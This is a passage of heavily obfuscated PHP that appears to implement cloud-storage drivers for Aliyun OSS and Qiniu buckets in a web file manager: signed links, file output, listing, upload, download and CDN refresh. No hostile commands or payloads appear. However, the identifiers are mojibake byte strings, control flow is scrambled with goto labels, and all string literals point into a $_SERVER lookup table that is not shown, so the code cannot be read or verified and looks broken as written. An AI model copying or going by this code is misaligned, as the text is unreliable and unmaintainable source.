return $FØÕê’åŠ½; goto dÎ†òÓê‚Î; d…ïºßµ˜å: $aºâ»­®£¢ =& $_SERVER[¨¤¼…´]; if ($F¨ãÃ¤åê == $aºâ»­®£¢[1187] && $this->isUploadServer() || $F¨ãÃ¤åê == $aºâ»­®£¢[115] && $this->isFileOutServer()) { return $FØÕê’åŠ½; } $E†òŒˆˆ‰ = floatval($GLOBALS[$aºâ»­®£¢[6]][$aºâ»­®£¢[94]][$aºâ»­®£¢[113]][$F¨ãÃ¤åê]) * 1024 * 1024 * 8; goto EÒ±Ûâ—°ã; dÎ†òÓê‚Î: } public function link($aÑ‹ï†Û¸â, $B¥äå¢êª· = array()) { $E«‰êŒÖ±Ë =& $_SERVER[¨¤¼…´]; if (!$this->exist($aÑ‹ï†Û¸â) || $this->isFolder($aÑ‹ï†Û¸â)) { return !1; } try { $B¥äå¢êª· = $this->trafficLimit($E«‰êŒÖ±Ë[115], $B¥äå¢êª·); $C·„¶¹èË = $this->client->signUrl($this->bucket, $this->pathEncode($aÑ‹ï†Û¸â), 3600 * 12, $E«‰êŒÖ±Ë[230], $B¥äå¢êª·); return $this->getCdnLink($C·„¶¹èË); } catch (OSS\Core\OssException $cë·à‰ÏÍ´) { return !1; } } public function fileOut($AÏãŒ»Š, $f…‚´—” = false, $FÙÆÒŠææ  = false, $f¸³ãŒë¿ = '') { goto E÷Ò†ŸÍİŠ; a½–ê”ÂùÔ: $f…‚´—” = $f…‚´—” ? $fÊ¤‚ÂŸ‰ [216] : $fÊ¤‚ÂŸ‰ [217]; $C¥ŒÓ„èä‚ = array(OSS\OssClient::OSS_SUB_RESOURCE => $fÊ¤‚ÂŸ‰ [1198] . rawurlencode("{$f…‚´—”}\73\146\151\154\x65\156\x61\x6d\145\75{$FÙÆÒŠææ }")); $C¥ŒÓ„èä‚[OSS\OssClient::OSS_SUB_RESOURCE] .= $fÊ¤‚ÂŸ‰ [1199] . rawurlencode($B°é»¶ã Õ); goto A¿‰Ó˜©È; E÷Ò†ŸÍİŠ: $fÊ¤‚ÂŸ‰  =& $_SERVER[¨¤¼…´]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÏãŒ»Š, $f…‚´—”, $FÙÆÒŠææ , $f¸³ãŒë¿); } if (!$FÙÆÒŠææ ) { $FÙÆÒŠææ  = $this->pathThis($AÏãŒ»Š); } goto FÙÔ„‘§µ; A¿‰Ó˜©È: $E¡ÃØ•˜‹ñ = $this->link($AÏãŒ»Š, $C¥ŒÓ„èä‚); $this->fileOutLink($E¡ÃØ•˜‹ñ); goto B½Ş©éŸÁÁ; FÙÔ„‘§µ: $FÙÆÒŠææ  = rawurlencode($FÙÆÒŠææ ); $B°é»¶ã Õ = get_file_mime(get_path_ext($FÙÆÒŠææ )); if ($B°é»¶ã Õ == $fÊ¤‚ÂŸ‰ [215]) { return parent::fileOut($AÏãŒ»Š, $f…‚´—”, $FÙÆÒŠææ , $f¸³ãŒë¿); } goto a½–ê”ÂùÔ; B½Ş©éŸÁÁ: } public function fileOutServer($eÆˆù†Õ, $cƒ¥Èß÷±è = false, $Fæ‚‰ê¬àŒ = false, $BˆáÒ•èòí = '') { parent::fileOut($eÆˆù†Õ, $cƒ¥Èß÷±è, $Fæ‚‰ê¬àŒ, $BˆáÒ•èòí); } public function fileOutImage($cŞ‘»º÷–è, $eÂÛâ˜¡‘ = 250) { $EÊÔÍâ¶œÉ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¨¤¼…´][1200] . $eÂÛâ˜¡‘); $bÒ‚ˆ›‘ = $this->link($cŞ‘»º÷–è, $EÊÔÍâ¶œÉ); $this->fileOutLink($bÒ‚ˆ›‘); } public function fileOutImageServer($e·†­Ç¢¹¾, $fÕˆÖÙÌã = 250) { parent::fileOutImage($e·†­Ç¢¹¾, $fÕˆÖÙÌã); } public function fileOutLink($e ¨›Çä¸„) { $bÄ½ÅÖÎ“ =& $_SERVER[¨¤¼…´]; if (!$this->isCdnHost() && substr($e ¨›Çä¸„, 0, 7) == $bÄ½ÅÖÎ“[1105]) { $e ¨›Çä¸„ = $bÄ½ÅÖÎ“[1106] . substr($e ¨›Çä¸„, 7); } header($bÄ½ÅÖÎ“[166] . $e ¨›Çä¸„); die; } public function hashMd5($c‡Ö—äÅ‚Ù, $fˆÏ¹Ø§í = '') { $EèøŒÑÁÎ¡ =& $_SERVER[¨¤¼…´]; $Bö‰‚ÔÒ«Û = $this->objectMeta($c‡Ö—äÅ‚Ù); if (!$Bö‰‚ÔÒ«Û) { return $EèøŒÑÁÎ¡[43]; } if (!isset($Bö‰‚ÔÒ«Û[$EèøŒÑÁÎ¡[1174]]) && !empty($fˆÏ¹Ø§í)) { $e°ëöõÊœÌ = $this->updateObjMeta($c‡Ö—äÅ‚Ù, array($EèøŒÑÁÎ¡[1174] => $fˆÏ¹Ø§í)); $Bö‰‚ÔÒ«Û[$EèøŒÑÁÎ¡[1174]] = $e°ëöõÊœÌ ? $fˆÏ¹Ø§í : $EèøŒÑÁÎ¡[43]; } return isset($Bö‰‚ÔÒ«Û[$EèøŒÑÁÎ¡[1174]]) ? strtolower($Bö‰‚ÔÒ«Û[$EèøŒÑÁÎ¡[1174]]) : $EèøŒÑÁÎ¡[43]; } public function size($Fœ±ïèå‹) { $fğÈêÈí…Í = $this->objectMeta($Fœ±ïèå‹); return $fğÈêÈí…Í ? $fğÈêÈí…Í[$_SERVER[¨¤¼…´][87]] : 0; } public function info($AÀ­Ş‹¸¿¹) { if ($this->isFolder($AÀ­Ş‹¸¿¹)) { return $this->folderInfo($AÀ­Ş‹¸¿¹); } else { if ($this->isFile($AÀ­Ş‹¸¿¹)) { return $this->fileInfo($AÀ­Ş‹¸¿¹); } } return !1; } public function exist($B´éõòíÑ) { return $this->isFile($B´éõòíÑ) || $this->isFolder($B´éõòíÑ); } public function isFile($BáÕ¸¸¸˜ğ) { return !$this->isFolder($BáÕ¸¸¸˜ğ) && $this->objectMeta($BáÕ¸¸¸˜ğ); } public function isFolder($Eà§ñçå…—) { return $this->cacheMethod($_SERVER[¨¤¼…´][236], $Eà§ñçå…—); } protected function objectMeta($B“ ›½…À´) { return $this->cacheMethod($_SERVER[¨¤¼…´][237], $B“ ›½…À´); } protected function _objectMeta($fì¹¬‘¡†¾) { $fäÕªßÆë =& $_SERVER[¨¤¼…´]; try { $f¸ßßŒ‘Ë = $this->client->getObjectMeta($this->bucket, $this->pathEncode($fì¹¬‘¡†¾)); } catch (OSS\Core\OssException $F“‹·¦ÈÍˆ) { $f¸ßßŒ‘Ë = !1; } if ($f¸ßßŒ‘Ë) { $f¸ßßŒ‘Ë[$fäÕªßÆë[87]] = intval($f¸ßßŒ‘Ë[$fäÕªßÆë[1181]]); } return $f¸ßßŒ‘Ë; } protected function _isFolder($a•¿ºµĞ–) { $d‚İ‚ÃĞ =& $_SERVER[¨¤¼…´]; if ($a•¿ºµĞ– == $d‚İ‚ÃĞ[43] || $a•¿ºµĞ– == $d‚İ‚ÃĞ[8]) { return !0; } $B§ëğÄæĞŠ = array($d‚İ‚ÃĞ[1171] => $d‚İ‚ÃĞ[8], $d‚İ‚ÃĞ[200] => rtrim($a•¿ºµĞ–, $d‚İ‚ÃĞ[8]) . $d‚İ‚ÃĞ[8], $d‚İ‚ÃĞ[1172] => 1, $d‚İ‚ÃĞ[1173] => $d‚İ‚ÃĞ[43]); $eî’ÜçšÎğ = $this->client->listObjects($this->bucket, $B§ëğÄæĞŠ); if ($eî’ÜçšÎğ->getObjectList() || $eî’ÜçšÎğ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($a¶¡Ù³Ö§º) { parent::__construct(); require_once SDK_DIR . $_SERVER[¨¤¼…´][1201]; $this->_init($a¶¡Ù³Ö§º); } public function _init($BáˆÕ«Â°¹) { goto CÀî±˜ëÉ—; CÀî±˜ëÉ—: $E¬à‚ÜæãÒ =& $_SERVER[¨¤¼…´]; foreach ($BáˆÕ«Â°¹ as $c¹´Å·­’Ì => $EÑ²–ªÉËĞ) { if (isset($this->{$c¹´Å·­’Ì})) { $this->{$c¹´Å·­’Ì} = $EÑ²–ªÉËĞ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($E¬à‚ÜæãÒ[1202] . LNG($E¬à‚ÜæãÒ[1162])); } goto BÆ¾Œù·Ô¸; bé­®ÕÙÆ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto cµŠ‰Ğ¿â; BÆ¾Œù·Ô¸: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto bé­®ÕÙÆ; cµŠ‰Ğ¿â: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($B¯”Ë÷È¿, $dˆÆÌ†£É = '', $A†´Õ‰æÌ‰ = REPEAT_RENAME) { if ($this->setContent($B¯”Ë÷È¿, $dˆÆÌ†£É)) { return $this->getPathOuter($B¯”Ë÷È¿); } return !1; } public function mkdir($D•ºó‚Ê¬£, $dÃ¦¥ƒìØ = REPEAT_SKIP) { goto EâÅÂö÷…š; EâÅÂö÷…š: $f¾«ãê“ƒô =& $_SERVER[¨¤¼…´]; $côßÂ¨‘¢ = trim($D•ºó‚Ê¬£, $f¾«ãê“ƒô[8]); if ($this->_isFolder($côßÂ¨‘¢)) { return $this->getPathOuter($côßÂ¨‘¢); } goto c›˜òÀíã­; c›˜òÀíã­: $D•ºó‚Ê¬£ = $côßÂ¨‘¢ . $f¾«ãê“ƒô[8]; $DØ©¦÷¾Ìø = get_path_this($côßÂ¨‘¢); $cîºµ§¬Ã· = $D•ºó‚Ê¬£ . $DØ©¦÷¾Ìø; goto FŠ‰Îâßğê; FŠ‰Îâßğê: if (!$this->mkfile($cîºµ§¬Ã·)) { return !1; } if (!$this->moveFile($cîºµ§¬Ã·, $D•ºó‚Ê¬£)) { $this->delFile($cîºµ§¬Ã·); return !1; } return $this->getPathOuter($côßÂ¨‘¢); goto c°œé®¶; c°œé®¶: } public function copyFile($c§åŒ½ƒø‹, $aÂ™´Ñ¶°ª) { $eµË¿£šÂï = $this->bucketManager->copy($this->bucket, $c§åŒ½ƒø‹, $this->bucket, $aÂ™´Ñ¶°ª, !0); return $eµË¿£šÂï ? !1 : $this->getPathOuter($aÂ™´Ñ¶°ª); } public function moveFile($d˜Ò³°ç±±, $bÈç‚Š¯«„) { $D¸Ø‹ë‡Ùˆ = $this->bucketManager->move($this->bucket, $d˜Ò³°ç±±, $this->bucket, $bÈç‚Š¯«„, !0); return $D¸Ø‹ë‡Ùˆ ? !1 : $this->getPathOuter($bÈç‚Š¯«„); } public function delFile($DÍØÉÔŒ’†) { if (!$this->exist($DÍØÉÔŒ’†)) { return !0; } $BªçÎÃç¥Ş = $this->bucketManager->delete($this->bucket, $DÍØÉÔŒ’†); return $BªçÎÃç¥Ş ? !1 : !0; } public function delFolder($e‚ŠÒ†¾–) { goto bÖğ¹á½êƒ; c°ğÂ‘‰°Ö: return !0; goto E™¾ëÖ‡¦İ; F¤éÁ™àà†: $a¥î…„÷æ‚ = 1000; if (count($b˜½ÈÅİå) <= $a¥î…„÷æ‚) { return $this->qnDelObj($b˜½ÈÅİå) ? !1 : !0; } foreach (array_chunk($b˜½ÈÅİå, $a¥î…„÷æ‚) as $C‡ŠºêÚÑ¥) { $cÙ¨æİº…¨ = $this->qnDelObj($C‡ŠºêÚÑ¥); if ($cÙ¨æİº…¨) { return !1; } } goto c°ğÂ‘‰°Ö; bÖğ¹á½êƒ: if (!$this->exist($e‚ŠÒ†¾–)) { return !0; } $b˜½ÈÅİå = $this->fileList($e‚ŠÒ†¾–); if (empty($b˜½ÈÅİå)) { return !0; } goto F¤éÁ™àà†; E™¾ëÖ‡¦İ: } private function qnDelObj($EºˆÛ¼­) { $d±£¨§³ñŠ = $this->bucketManager->buildBatchDelete($this->bucket, $EºˆÛ¼­); list($a¬°©±ùåë, $EÂ¦Œèé‡¼) = $this->bucketManager->batch($d±£¨§³ñŠ); return $EÂ¦Œèé‡¼; } private function fileList($b„…Œ‚º, $DÆ—›ò­ = 0) { goto F˜½Ä¤§·È; fçã¬¨÷¬”: $C¶õÎÜÉ = $e’ˆäÑö[43]; $Eµ½‡Œ†²÷ = 1000; $AØ®Çâ‹ = $e’ˆäÑö[43]; goto dªŸÍ‚´‚á; F˜½Ä¤§·È: $e’ˆäÑö =& $_SERVER[¨¤¼…´]; $b„…Œ‚º = trim($b„…Œ‚º, $e’ˆäÑö[8]); $Eİ¤Ÿ‹ = empty($b„…Œ‚º) ? $e’ˆäÑö[43] : $b„…Œ‚º . $e’ˆäÑö[8]; goto fçã¬¨÷¬”; dªŸÍ‚´‚á: $Bèè†Æª»Í = array(); while (!0) { list($aÒñœˆÖ”, $A­®³Ç£) = $this->bucketManager->listFiles($this->bucket, $Eİ¤Ÿ‹, $C¶õÎÜÉ, $Eµ½‡Œ†²÷, $AØ®Çâ‹); if ($A­®³Ç£) { return !1; } $C¶õÎÜÉ = array_key_exists($e’ˆäÑö[1173], $aÒñœˆÖ”) ? $C¶õÎÜÉ = $aÒñœˆÖ”[$e’ˆäÑö[1203]] : $e’ˆäÑö[43]; foreach ($aÒñœˆÖ”[$e’ˆäÑö[1204]] as $e£Ù¡À) { $bĞ†•¤ñÁ™ = $e£Ù¡À[$e’ˆäÑö[99]]; if ($DÆ—›ò­) { $bĞ†•¤ñÁ™ = array($e’ˆäÑö[38] => $bĞ†•¤ñÁ™, $e’ˆäÑö[87] => $e£Ù¡À[$e’ˆäÑö[1205]]); } $Bèè†Æª»Í[] = $bĞ†•¤ñÁ™; } if ($C¶õÎÜÉ == $e’ˆäÑö[43]) { break; } } return $Bèè†Æª»Í; goto Aƒç÷°åô°; Aƒç÷°åô°: } public function rename($AåëÈßÙÚ, $BåË®¨”æÆ) { return $this->renameObject($AåëÈßÙÚ, $BåË®¨”æÆ); } public function fileInfo($e¿Ûœ‘§Ìˆ, $BÕ÷¿”Œ‰ = false, $a”·äˆ¬ÜÎ = array()) { goto AçñšÉ†‰; AÅ‘©‚˜öŞ: if (empty($a”·äˆ¬ÜÎ)) { $a”·äˆ¬ÜÎ = $this->objectMeta($e¿Ûœ‘§Ìˆ); if (!$a”·äˆ¬ÜÎ) { return $Dº¸ØŞ‘; } } if (isset($a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1206]])) { $Dº¸ØŞ‘[$DÂåù·Ÿ‚[117]] = substr($a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1206]] . $DÂåù·Ÿ‚[43], 0, 10); } if (isset($a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1205]])) { $Dº¸ØŞ‘[$DÂåù·Ÿ‚[87]] = $a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1205]]; } goto eÈ÷Ğ´µ¤—; eÈ÷Ğ´µ¤—: return $Dº¸ØŞ‘; goto c±ë¯Š‹Â·; AçñšÉ†‰: $DÂåù·Ÿ‚ =& $_SERVER[¨¤¼…´]; if ($BÕ÷¿”Œ‰) { return array($DÂåù·Ÿ‚[38] => $this->pathThis($e¿Ûœ‘§Ìˆ), $DÂåù·Ÿ‚[85] => $this->getPathOuter($DÂåù·Ÿ‚[8] . $e¿Ûœ‘§Ìˆ), $DÂåù·Ÿ‚[39] => $DÂåù·Ÿ‚[181], $DÂåù·Ÿ‚[87] => isset($a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1205]]) ? $a”·äˆ¬ÜÎ[$DÂåù·Ÿ‚[1205]] : 0, $DÂåù·Ÿ‚[175] => $this->ext($e¿Ûœ‘§Ìˆ)); } $Dº¸ØŞ‘ = array($DÂåù·Ÿ‚[38] => $this->pathThis($e¿Ûœ‘§Ìˆ), $DÂåù·Ÿ‚[85] => $this->getPathOuter($DÂåù·Ÿ‚[8] . $e¿Ûœ‘§Ìˆ), $DÂåù·Ÿ‚[39] => $DÂåù·Ÿ‚[181], $DÂåù·Ÿ‚[201] => 0, $DÂåù·Ÿ‚[117] => 0, $DÂåù·Ÿ‚[87] => 0, $DÂåù·Ÿ‚[175] => $this->ext($e¿Ûœ‘§Ìˆ), $DÂåù·Ÿ‚[202] => !0, $DÂåù·Ÿ‚[203] => !0); goto AÅ‘©‚˜öŞ; c±ë¯Š‹Â·: } public function folderInfo($Dó¶¼ Ê·§, $b×ÜœÊ·— = false) { goto Aå›¢†©Š; f”í±ñóøù: return $Eï¾çÄ£„¹; goto Eì‘¬ñè¬; dÖ×­¸©†£: $Dó¶¼ Ê·§ = rtrim($Dó¶¼ Ê·§, $e–ğ×½µå[8]) . $e–ğ×½µå[8]; $aà‰²¤›·˜ = $this->objectMeta($Dó¶¼ Ê·§); if (isset($aà‰²¤›·˜[$e–ğ×½µå[1206]])) { $Eï¾çÄ£„¹[$e–ğ×½µå[117]] = substr($aà‰²¤›·˜[$e–ğ×½µå[1206]] . $e–ğ×½µå[43], 0, 10); } goto f”í±ñóøù; Aå›¢†©Š: $e–ğ×½µå =& $_SERVER[¨¤¼…´]; if ($b×ÜœÊ·—) { return array($e–ğ×½µå[38] => $this->pathThis($Dó¶¼ Ê·§), $e–ğ×½µå[85] => $this->getPathOuter($e–ğ×½µå[8] . $Dó¶¼ Ê·§), $e–ğ×½µå[39] => $e–ğ×½µå[86]); } $Eï¾çÄ£„¹ = array($e–ğ×½µå[38] => $this->pathThis($Dó¶¼ Ê·§), $e–ğ×½µå[85] => $this->getPathOuter($e–ğ×½µå[8] . $Dó¶¼ Ê·§), $e–ğ×½µå[39] => $e–ğ×½µå[86], $e–ğ×½µå[201] => 0, $e–ğ×½µå[117] => 0, $e–ğ×½µå[1152] => !0, $e–ğ×½µå[1153] => !0); goto dÖ×­¸©†£; Eì‘¬ñè¬: } public function listPath($DßÌóÁ»é, $FŞ¢·óôİ = false) { goto A«Æ¨Èßè‡; d˜ŒòÅÚ: $f˜„ÑğƒŞ… = $E ³ğ†ãº[43]; $cÉçïĞ¼’ = 1000; $e„÷÷£èÀ‹ = $E ³ğ†ãº[8]; goto Fæ‚¤•¹Î; A«Æ¨Èßè‡: $E ³ğ†ãº =& $_SERVER[¨¤¼…´]; $DßÌóÁ»é = trim($DßÌóÁ»é, $E ³ğ†ãº[8]); $aã¥‡Ïçƒµ = empty($DßÌóÁ»é) ? $E ³ğ†ãº[43] : $DßÌóÁ»é . $E ³ğ†ãº[8]; goto d˜ŒòÅÚ; Fæ‚¤•¹Î: $fŞåä™»† = $FİâæèÌ¨â = array(); while (!0) { list($c†‚ÖÙ×ÏŞ, $b’±Î†Öë¸) = $this->bucketManager->listFiles($this->bucket, $aã¥‡Ïçƒµ, $f˜„ÑğƒŞ…, $cÉçïĞ¼’, $e„÷÷£èÀ‹); if ($b’±Î†Öë¸) { return !1; } $f˜„ÑğƒŞ… = array_key_exists($E ³ğ†ãº[1173], $c†‚ÖÙ×ÏŞ) ? $f˜„ÑğƒŞ… = $c†‚ÖÙ×ÏŞ[$E ³ğ†ãº[1203]] : $E ³ğ†ãº[43]; if (isset($c†‚ÖÙ×ÏŞ[$E ³ğ†ãº[1207]])) { foreach ($c†‚ÖÙ×ÏŞ[$E ³ğ†ãº[1207]] as $AÖ•†ÅéŠ‰) { if ($AÖ•†ÅéŠ‰ == $aã¥‡Ïçƒµ) { continue; } $fŞåä™»†[] = $this->folderInfo($AÖ•†ÅéŠ‰, $FŞ¢·óôİ); } } if (isset($c†‚ÖÙ×ÏŞ[$E ³ğ†ãº[1204]])) { foreach ($c†‚ÖÙ×ÏŞ[$E ³ğ†ãº[1204]] as $aÑ´‡‘ï˜) { if ($aÑ´‡‘ï˜[$E ³ğ†ãº[99]] == $aã¥‡Ïçƒµ) { continue; } $FİâæèÌ¨â[] = $this->fileInfo($aÑ´‡‘ï˜[$E ³ğ†ãº[99]], $FŞ¢·óôİ, $aÑ´‡‘ï˜); } } if ($f˜„ÑğƒŞ… == $E ³ğ†ãº[43]) { break; } } return array($E ³ğ†ãº[84] => $fŞåä™»†, $E ³ğ†ãº[83] => $FİâæèÌ¨â); goto C—Õ¿ğôµ¹; C—Õ¿ğôµ¹: } public function has($A˜°ğ¼¾½º, $c‹äÆŠÇ¤• = false, $D²„£ĞÔ…ø = true) { goto bˆ¥©œí‹; bè÷©áŞùª: $D˜à»¼‹Ë’ = $EŠÄùÜ†Ã[43]; $a®´•¬âñõ = 1000; $e—ÙçÀëâ˜ = $EŠÄùÜ†Ã[8]; goto d¾¸—öÏä‡; d¾¸—öÏä‡: $b´›ßñˆì = 0; $FØĞîÉç±¸ = 0; while (!0) { list($aÙ‰Ñ„ÓØ, $A÷ºÉİÎ­Í) = $this->bucketManager->listFiles($this->bucket, $fÙòÇ°¦š‡, $D˜à»¼‹Ë’, $a®´•¬âñõ, $e—ÙçÀëâ˜); if ($A÷ºÉİÎ­Í) { return !1; } $D˜à»¼‹Ë’ = array_key_exists($EŠÄùÜ†Ã[1173], $aÙ‰Ñ„ÓØ) ? $D˜à»¼‹Ë’ = $aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1203]] : $EŠÄùÜ†Ã[43]; if ($c‹äÆŠÇ¤•) { if (!empty($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1204]])) { $b´›ßñˆì += count($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1204]]); } if (!empty($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1207]])) { $FØĞîÉç±¸ += count($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1207]]); } if ($D˜à»¼‹Ë’ === $EŠÄùÜ†Ã[43]) { break; } continue; } if ($D²„£ĞÔ…ø) { if (!empty($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1204]])) { return !0; } } else { if (!empty($aÙ‰Ñ„ÓØ[$EŠÄùÜ†Ã[1207]])) { return !0; } } if ($D˜à»¼‹Ë’ == $EŠÄùÜ†Ã[43]) { break; } } goto EšêÒò”; EšêÒò”: if ($c‹äÆŠÇ¤•) { return array($EŠÄùÜ†Ã[205] => $b´›ßñˆì, $EŠÄùÜ†Ã[206] => $FØĞîÉç±¸); } return !1; goto C¬¦Í¹…›«; bˆ¥©œí‹: $EŠÄùÜ†Ã =& $_SERVER[¨¤¼…´]; $A˜°ğ¼¾½º = trim($A˜°ğ¼¾½º, $EŠÄùÜ†Ã[8]); $fÙòÇ°¦š‡ = empty($A˜°ğ¼¾½º) ? $EŠÄùÜ†Ã[43] : $A˜°ğ¼¾½º . $EŠÄùÜ†Ã[8]; goto bè÷©áŞùª; C¬¦Í¹…›«: } public function listAll($Bö×Ì„Ë†) { $DõÛ°»Î¤ƒ =& $_SERVER[¨¤¼…´]; $D†äŸÅîô¦ = $this->fileList($Bö×Ì„Ë†, 1); $eñ“èÕé¸ƒ = array(); foreach ($D†äŸÅîô¦ as $bàÂÓ‡ÍÊƒ) { $eñ“èÕé¸ƒ[$bàÂÓ‡ÍÊƒ[$DõÛ°»Î¤ƒ[38]]] = $bàÂÓ‡ÍÊƒ[$DõÛ°»Î¤ƒ[87]]; } return $this->listAllFiles($Bö×Ì„Ë†, array_keys($eñ“èÕé¸ƒ), $eñ“èÕé¸ƒ); } public function canRead($C–ÜÕœçÕ£) { return $this->exist($C–ÜÕœçÕ£) ? !0 : !1; } public function canWrite($cîèÁ¦©‘ò) { return $this->exist($cîèÁ¦©‘ò) ? !0 : !1; } public function getContent($cí¯´†„’ç) { return $this->fileSubstr($cí¯´†„’ç, 0, -1); } public function setContent($d—šì½È, $BƒÓ¯áíÚ = '') { $cåÜê¬ç× = $this->tempFile($this->pathThis($d—šì½È)); file_put_contents($cåÜê¬ç×, $BƒÓ¯áíÚ); if ($this->upload($d—šì½È, $cåÜê¬ç×)) { $this->tempFileRemve($cåÜê¬ç×); return !0; } return !1; } public function refreshUrls($Cõçîè±ñ×) { goto cáƒ„øŠÏ; F—ÊºÒ±»…: return $f‘ìÚÕµñ[$CÏêÀ¸éºÆ[1208]] == $CÏêÀ¸éºÆ[686] ? !0 : !1; goto EğÂ›‘Í»°; a«ØÓ¼¸Ä: $dÛ„’¹…­Œ = new Qiniu\Cdn\CdnManager($this->auth); list($f‘ìÚÕµñ, $C’–õÃ ÖÜ) = $dÛ„’¹…­Œ->refreshUrls($BêËç°ÇÚˆ); if ($C’–õÃ ÖÜ) { return !1; } goto F—ÊºÒ±»…; cáƒ„øŠÏ: $CÏêÀ¸éºÆ =& $_SERVER[¨¤¼…´]; $BêËç°ÇÚˆ = array(); if (is_array($Cõçîè±ñ×)) { foreach ($Cõçîè±ñ× as $a„ŒùÇÈ¶À) { $BêËç°ÇÚˆ[] = $this->link($a„ŒùÇÈ¶À); } } else { $BêËç°ÇÚˆ[] = $this->link($Cõçîè±ñ×); } goto a«ØÓ¼¸Ä; EğÂ›‘Í»°: } public function fileSubstr($f­‘ôÍÄÔè, $CŒĞ“¾ŠÓø, $F®¿çêî¿) { $aÖò¿ÍÁ… =& $_SERVER[¨¤¼…´]; if (!($F¤ö¥ÓØ—¾ = $this->link($f­‘ôÍÄÔè))) { return !1; } $dôî“Ûâßµ = !1; if ($F®¿çêî¿ > 0) { $F™‰²ß²˜ = $CŒĞ“¾ŠÓø + $F®¿çêî¿ - 1; $dôî“Ûâßµ = array($aÖò¿ÍÁ…[1209] . $CŒĞ“¾ŠÓø . $aÖò¿ÍÁ…[424] . $F™‰²ß²˜); } $e’Ó»”æà® = url_request($F¤ö¥ÓØ—¾, $aÖò¿ÍÁ…[230], !1, $dôî“Ûâßµ); return $e’Ó»”æà®[$aÖò¿ÍÁ…[679]] ? $e’Ó»”æà®[$aÖò¿ÍÁ…[1025]] : !1; } public function upload($b¤Œî˜—„ã, $D´º®‘÷„Œ, $AÄ´½¦ò¼À = false, $BÛÁÏ‹„¬œ = REPEAT_REPLACE) { $b»£†Œ¿ÒÙ = new Qiniu\Storage\UploadManager(); $F›Óµ©›ƒ = $this->auth->uploadToken($this->bucket, $b¤Œî˜—„ã); $DŠæ¿±³Ş = get_file_mime(get_path_ext($D´º®‘÷„Œ)); list($aìá´°î¤‡, $C±êÀì›”Ì) = $b»£†Œ¿ÒÙ->putFile($F›Óµ©›ƒ, $b¤Œî˜—„ã, $D´º®‘÷„Œ, null, $DŠæ¿±³Ş); return $C±êÀì›”Ì ? !1 : $this->getPathOuter($b¤Œî˜—„ã); } public function uploadFormData($eø¨ˆ‚İ…™, $E“Ü£íƒÊñ = 3600) { return $this->uploadToken($eø¨ˆ‚İ…™, $E“Ü£íƒÊñ); } public function multiUploadFormData($céÛÜ«Œñ¸, $f¤É¸Ò÷ÕÁ = 3600) { return $this->uploadToken($céÛÜ«Œñ¸, $f¤É¸Ò÷ÕÁ); } private function uploadToken($FĞ‘ÑËŸ¡, $fÃô¥ £Í = 3600) { goto f–òÌÇ‰¯Ñ; Bçí±ï¯‡”: $e¯í§“×í¦ = $FĞ‘ÑËŸ¡; $BÓÎÛó›Õİ = $this->auth->uploadToken($this->bucket, $e¯í§“×í¦, $e²ñãø÷¨ê, $F»³÷ÁÊĞœ, !0); $DÚùˆÆÛ­ï = empty($this->region) || $this->region == $f¥îèÖöÎë[1212] ? $f¥îèÖöÎë[43] : $f¥îèÖöÎë[424] . $this->region; goto d£•–Š„é÷; d£•–Š„é÷: $aãÚãİ™ğ˜ = http_type() . "\x3a\57\x2f\165\160\x6c\157\x61\144{$DÚùˆÆÛ­ï}\56\161\x69\156\x69\165\x70\56\x63\157\155\x2f"; return array($f¥îèÖöÎë[1213] => $BÓÎÛó›Õİ, $f¥îèÖöÎë[1214] => $aãÚãİ™ğ˜); goto eñ×—‹º´; f–òÌÇ‰¯Ñ: $f¥îèÖöÎë =& $_SERVER[¨¤¼…´]; $e²ñãø÷¨ê = $fÃô¥ £Í; $F»³÷ÁÊĞœ = array($f¥îèÖöÎë[1210] => $f¥îèÖöÎë[1211]); goto Bçí±ï¯‡”; eñ×—‹º´: } public function download($dŞßíçŠ”ù, $d¿ğØØšÉ) { goto E÷‚à´¸¥; EêÌÚ¸Ü„ì: fclose($dñ¯ÈßƒäÈ); return $d¿ğØØšÉ; goto eòïàÛõ„¯; E÷‚à´¸¥: $d‹»ßãˆÖ‹ = IO::getPathInner(IO::mkfile($d¿ğØØšÉ)); if (!($dÎ¥ç¤¥Å¢ = $this->link($dŞßíçŠ”ù))) { return !1; } $eĞÈäâ¥õ¸ = 0; goto dµ¹¯¸ì·¾; dµ¹¯¸ì·¾: $DÚÈöé™Ş = 1024 * 200; $dñ¯ÈßƒäÈ = fopen($d‹»ßãˆÖ‹, $_SERVER[¨¤¼…´][1215]); while (!0) { $dºÇÃØƒ¬ê = $this->fileSubstr($dŞßíçŠ”ù, $eĞÈäâ¥õ¸, $DÚÈöé™Ş); if ($dºÇÃØƒ¬ê === !1) { return !1; } fwrite($dñ¯ÈßƒäÈ, $dºÇÃØƒ¬ê); $eĞÈäâ¥õ¸ += $DÚÈöé™Ş; if (strlen($dºÇÃØƒ¬ê) < $DÚÈöé™Ş) { break; } } goto EêÌÚ¸Ü„ì; eòïàÛõ„¯: } public function link($a¸½öÌŒÆ², $bãŸÊˆŠÇ = '') { if (!$this->isFile($a¸½öÌŒÆ²)) { return !1; } $bèÇíƒ–à = $this->getHost() . $_SERVER[¨¤¼…´][8] . $this->pathEncode($a¸½öÌŒÆ²) . $bãŸÊˆŠÇ; return 